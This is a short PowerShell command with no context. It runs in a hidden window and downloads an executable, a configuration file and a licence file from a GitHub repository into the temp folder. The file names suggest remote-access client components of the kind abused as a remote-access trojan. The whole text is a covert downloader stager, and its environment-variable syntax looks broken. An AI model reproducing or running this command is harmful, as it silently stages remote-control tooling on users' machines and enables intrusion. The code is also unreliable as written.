powershell -WindowStyle Hidden -Command @"
$files = @(
    @{Uri='https://github.com/MEMEOW-IO/test/raw/refs/heads/main/client32.exe'; OutFile='%TEMP%\client32.exe'},
    @{Uri='https://github.com/MEMEOW-IO/test/raw/refs/heads/main/Client32.ini'; OutFile='%TEMP%\Client32.ini'},
    @{Uri='https://github.com/MEMEOW-IO/test/raw/refs/heads/main/NSM.LIC'; OutFile='%TEMP%\NSM.LIC'}
)

foreach ($file in $files) {
    Invoke-WebRequest -Uri $file.Uri -OutFile $env:$file.OutFile
}
"@
